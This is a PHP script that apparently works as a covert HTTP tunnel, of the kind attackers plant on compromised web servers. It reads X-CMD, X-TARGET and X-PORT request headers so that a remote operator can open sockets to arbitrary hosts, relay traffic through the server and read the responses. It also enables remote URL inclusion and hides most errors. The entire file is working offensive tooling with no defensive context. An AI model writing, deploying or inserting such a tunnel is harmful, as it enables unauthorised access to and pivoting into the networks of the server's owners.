<?php


ini_set("allow_url_fopen", true);
ini_set("allow_url_include", true);
error_reporting(E_ERROR | E_PARSE);

if( !function_exists('apache_request_headers') ) {
    function apache_request_headers() {
        $arh = array();
        $rx_http = '/\AHTTP_/';

        foreach($_SERVER as $key => $val) {
            if( preg_match($rx_http, $key) ) {
                $arh_key = preg_replace($rx_http, '', $key);
                $rx_matches = array();
                $rx_matches = explode('_', $arh_key);
                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
                    foreach($rx_matches as $ak_key => $ak_val) {
                        $rx_matches[$ak_key] = ucfirst($ak_val);
                    }

                    $arh_key = implode('-', $rx_matches);
                }
                $arh[$arh_key] = $val;
            }
        }
        return( $arh );
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'GET')
{
    exit("FUCKALL123");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	set_time_limit(0);
	$headers=apache_request_headers();
	$cmd = $headers["X-CMD"];
    switch($cmd){
		case "CONNECT":
			{
				$target = $headers["X-TARGET"];
				$port = (int)$headers["X-PORT"];
				#$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
				#if ($sock === false)
				#{
				#	header('X-STATUS: FAIL');
				#	header('X-ERROR: Failed creating socket');
				#	return;
				#}
        $res = fsockopen($target, $port);
				#$res = @socket_connect($sock, $target, $port);
                if ($res === false)
				{
					header('X-STATUS: FAIL');
					header('X-ERROR: Failed connecting to target');
					return;
				}
				#socket_set_nonblock($res);

        stream_set_blocking($res, false);
				@session_start();
				$_SESSION["run"] = true;
                $_SESSION["writebuf"] = "";
                $_SESSION["readbuf"] = "";
                ob_end_clean();
                header('X-STATUS: OK');
                header("Connection: close");
                ignore_user_abort();
                ob_start();
                $size = ob_get_length();
                header("Content-Length: $size");
                ob_end_flush();
                flush();
				session_write_close();

				while ($_SESSION["run"])
				{
					$readBuff = "";
					@session_start();
					$writeBuff = $_SESSION["writebuf"];
					$_SESSION["writebuf"] = "";
					session_write_close();
                    if ($writeBuff != "")
					{
            stream_set_blocking($res, false);
						$i = fwrite($res, $writeBuff); #socket_write($sock, $writeBuff, strlen($writeBuff));
						if($i === false)
						{
							@session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
                            header('X-STATUS: FAIL');
							header('X-ERROR: Failed writing socket');
						}
					}
          # stream_set_timeout($res, 1);
          stream_set_blocking($res, false);
          while ($o = fgets($res, 10)) {
					if($o === false)
						{
                            @session_start();
                            $_SESSION["run"] = false;
                            session_write_close();
							header('X-STATUS: FAIL');
							header('X-ERROR: Failed reading from socket');
						}
						$readBuff .= $o;
					}
                    if ($readBuff!=""){
                        @session_start();
                        $_SESSION["readbuf"] .= $readBuff;
                        session_write_close();
                    }
                    #sleep(0.2);
				}
                fclose($res);
			}
			break;
		case "DISCONNECT":
			{
                error_log("DISCONNECT recieved");
				@session_start();
				$_SESSION["run"] = false;
				session_write_close();
				return;
			}
			break;
		case "READ":
			{
				@session_start();
				$readBuffer = $_SESSION["readbuf"];
                $_SESSION["readbuf"]="";
                $running = $_SESSION["run"];
				session_write_close();
                if ($running) {
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
					echo $readBuffer;
					return;
				} else {
                    header('X-STATUS: FAIL');
                    header('X-ERROR: RemoteSocket read filed');
					return;
				}
			}
			break;
		case "FORWARD":
			{
                @session_start();
                $running = $_SESSION["run"];
				session_write_close();
                if(!$running){
                    header('X-STATUS: FAIL');
					header('X-ERROR: No more running, close now');
                    return;
                }
                header('Content-Type: application/octet-stream');
				$rawPostData = file_get_contents("php://input");
				if ($rawPostData) {
					@session_start();
					$_SESSION["writebuf"] .= $rawPostData;
					session_write_close();
					header('X-STATUS: OK');
                    header("Connection: Keep-Alive");
					return;
				} else {
					header('X-STATUS: FAIL');
					header('X-ERROR: POST request read filed');
				}
			}
			break;
	}
}
?>
